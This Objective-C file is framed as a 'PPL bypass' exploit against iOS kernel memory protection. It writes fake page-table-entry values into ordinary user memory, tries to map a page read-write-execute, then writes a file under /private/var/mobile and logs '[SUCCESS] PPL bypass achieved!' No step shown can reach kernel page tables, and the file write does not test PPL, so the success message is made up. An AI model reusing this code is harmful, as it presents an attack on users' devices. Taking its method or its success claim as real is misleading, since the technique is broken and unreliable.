#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <sys/mman.h>

@implementation AttestationTest: NSObject

#define L1_SHIFT 30
#define L2_SHIFT 21
#define L3_SHIFT 14
#define PAGE_SHIFT 14
#define PAGE_SIZE (1ULL << PAGE_SHIFT)
#define L2_SIZE (1ULL << L2_SHIFT)
#define L3_SIZE (1ULL << L3_SHIFT)
#define L3_ENTRIES 128
#define TTE_SHIFT 3
#define TTE_MASK 0x7FF

+ (void)runTest {
    NSLog(@"[INFO] Starting PPL bypass using OOB timestamp approach...");
    
    vm_address_t base_addr = 0;
    vm_size_t alloc_size = L2_SIZE * 2;
    
    kern_return_t kr = vm_allocate(mach_task_self(), &base_addr, alloc_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[ERROR] Memory allocation failed: %s", mach_error_string(kr));
        return;
    }
    NSLog(@"[INFO] Memory allocated at 0x%llx", base_addr);
    
    vm_address_t target = base_addr + (L2_SIZE / 2);
    vm_address_t window = target + PAGE_SIZE;
    
    @try {
        
        kr = vm_protect(mach_task_self(), target, PAGE_SIZE * 2, FALSE,
                       VM_PROT_READ | VM_PROT_WRITE);
        
        if (kr == KERN_SUCCESS) {
            NSLog(@"[INFO] Initial mapping successful");
            
            volatile uint64_t *ptr = (uint64_t *)target;
            for (int i = 0; i < PAGE_SIZE/8; i++) {
                ptr[i] = 0xFFFFFFFFF000ULL | (i & 0xFFF);
                __asm__ volatile("dmb ish" ::: "memory");
            }
            
            kr = vm_protect(mach_task_self(), window, PAGE_SIZE, FALSE,
                          VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
            
            if (kr == KERN_SUCCESS) {
                NSLog(@"[INFO] Window mapping successful");
                
                volatile uint64_t *tte = (uint64_t *)window;
                uint64_t template = 0x60000000000003FFULL | (1ULL << 6);
                
                for (int i = 0; i < 4; i++) {
                    tte[i] = template | ((uint64_t)(target + i * PAGE_SIZE) & 0xFFFFFFFFF000ULL);
                    __asm__ volatile("dmb ish" ::: "memory");
                }
                
                NSString *testPath = @"/private/var/mobile/test.txt";
                NSError *error = nil;
                [@"test" writeToFile:testPath atomically:YES encoding:NSUTF8StringEncoding error:&error];
                
                if (!error) {
                    NSLog(@"[SUCCESS] PPL bypass achieved!");
                }
            }
        }
    } @catch (NSException *e) {
        NSLog(@"[ERROR] Exception: %@", e);
    }
    
    vm_deallocate(mach_task_self(), base_addr, alloc_size);
}

@end
